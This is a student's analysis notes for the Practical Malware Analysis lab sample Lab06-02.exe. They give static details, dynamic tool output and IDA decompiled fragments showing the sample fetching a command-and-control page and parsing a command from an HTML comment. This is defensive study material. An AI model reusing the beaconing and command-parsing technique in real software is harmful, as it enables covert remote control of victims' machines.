Lab06-02.exe
    PE Analysis
        # Virustotal
            35/70
            SHA-256: b71777edbf21167c96d20ff803cbcb25d24b94b3652db2f286dcd6efd3d8416a

        # PEid
            Microsoft Visual C++ 6.0

        # PEview
            TimeStamp (IMAGE_FILE_HEADER): 2011/02/02 Wed 21:29:05 UTC
            Subsystem (IMAGE_OPTIONAL_HEADER): IMAGE_SUBSYSTEM_WINDOWS_CUI (cmd)
            Sections (Virtual Size / Size of Raw Data) -> No Packed
                .text: 4A78/5000
                .rdata: 95E/1000
                .data: 3F08/3000
        
        # Dependency Walker
            KERNEL32.DLL
                CloseHandle
                ExitProcess
                FlushFileBuffers
                FreeEnvironmentStringsA
                FreeEnvironmentStringsW
                GetACP
                GetCPInfo
                GetCommandLineA
                GetCurrentProcess
                GetEnvironmentStrings
                GetEnvironmentStringsW
                GetEnvironmentVariableA
                GetFileType
                GetLastError
                GetModuleFileNameA
                GetModuleHandleA
                GetOEMCP
                GetProcAddress
                GetStartupInfoA
                GetStdHandle
                GetStringTypeA
                GetStringTypeW
                GetVersion
                GetVersionExA
                HeapAlloc
                HeapCreate
                HeapDestroy
                HeapFree
                HeapReAlloc
                LCMapStringA
                LCMapStringW
                LoadLibraryA
                MultiByteToWideChar
                RtlUnwind
                SetFilePointer
                SetHandleCount
                SetStdHandle
                Sleep
                TerminateProcess
                UnhandledExceptionFilter
                VirtualAlloc
                VirtualFree
                WideCharToMultiByte
                WriteFile
            WININET.DLL
                InternetCloseHandle
                InternetGetConnectedState
                InternetOpenA
                InternetOpenUrlA
                InternetReadFile

        # strings.exe (Only part of the results)
            Error 1.1: No Internet
            Success: Internet Connection
            Error 2.3: Fail to get command
            Error 2.2: Fail to ReadFile
            Error 2.1: Fail to OpenUrl
            http://www.practicalmalwareanalysis.com/cc.htm
            Internet Explorer 7.5/pma
            Success: Parsed command is %c

    Dynamic Analysis
        C:\Documents and Settings\practice\Desktop>Lab06-02.exe
        Success: Internet Connection
        Error 2.1: Fail to OpenUrl

        # RegShot (Part of results)
            ----------------------------------
            Values modified:1
            ----------------------------------
            HKLM\SOFTWARE\Microsoft\Cryptography\RNG\Seed: AF 30 20 B5 B9 FC 20 A5 8A 69 BE 7E 0A 9E A6 2C 00 1F 14 02 40 F6 FA 0D BD C5 4F 2A 4C 72 26 94 C9 E7 E8 31 47 60 7D 59 EE 14 07 EE 1A 64 C6 63 58 60 F5 1E 09 59 2D D3 FD 64 4E 9E 40 ED 41 F6 C4 EA DA A2 92 F7 41 D2 23 1C E8 2D 16 65 B3 77
            HKLM\SOFTWARE\Microsoft\Cryptography\RNG\Seed: FE 34 A5 EB 03 CB CD 7B 98 6A B5 AF 94 BD 58 BA AB 80 AA 44 B1 41 E9 F2 A8 B5 BF A8 EF A1 90 F4 02 0A AB C9 5A 16 56 EB 4B AC B0 08 BB 91 65 B6 5B 2E BE 2C E8 0C DE 5B F2 2D 24 1E 48 17 B8 6A 29 67 37 0B 7D 27 E0 47 EF 6D 57 D4 D4 CB FD 10

        # procexp (View > Lower Pane View > DLLS / Handles)
            NULL

        # procmon
            NULL

        # ApateDNS
            www.practicalmalwareanalysis.com
            33 CF 01 00 00 01 00 00  00 00 00 00 03 77 77 77            3Ï···········www
            18 70 72 61 63 74 69 63  61 6C 6D 61 6C 77 61 72            ·practicalmalwar
            65 61 6E 61 6C 79 73 69  73 03 63 6F 6D 00 00 01            eanalysis·com···
            00 01 00 00                                                 ···· 

        # INetSim
            Due to some problem, we cannot see anything here because the malware cannot open url. But we can get what it want to access from the following IDA analysis.
        
        # IDA Pro
            Internet connection test
                signed int sub_401000()
                {
                signed int result; // eax

                if ( InternetGetConnectedState(0, 0) )
                {
                    sub_40117F(aSuccessInterne);
                    result = 1;
                }
                else
                {
                    sub_40117F(aError11NoInter);
                    result = 0;
                }
                return result;
                }
            
            printf()

            Access http://www.practicalmalwareanalysis.com/cc.htm and read the HTML content
                hFile = InternetOpenUrlA(hInternet, szUrl, 0, 0, 0, 0);// http://www.practicalmalwareanalysis.com/cc.htm
                if ( hFile )
                {
                    v9 = InternetReadFile(hFile, &Buffer, 0x200u, &dwNumberOfBytesRead);

            IF-ELSE

            Internet connection state checking exists.


Analysis
    Firstly it will check if it can connect to the Internet, then it will open the url http://www.practicalmalwareanalysis.com/cc.htm and read the HTML content. From the following,
    if ( Buffer != 0x3C || v2 != 0x21 || v3 != 0x2D || v4 != 0x2D )
      {
        sub_40117F(aError23FailToG);
        result = 0;
      }
    we can know that the malware will read from the position after <!--
    Then it will return the content to sub_40117F, the content will be appended after the string "Success: Parsed command is ". At last, the malware will sleep about 1 minite.
    .text:0040116E                 push    0EA60h          ; dwMilliseconds
    .text:00401173                 call    ds:Sleep
    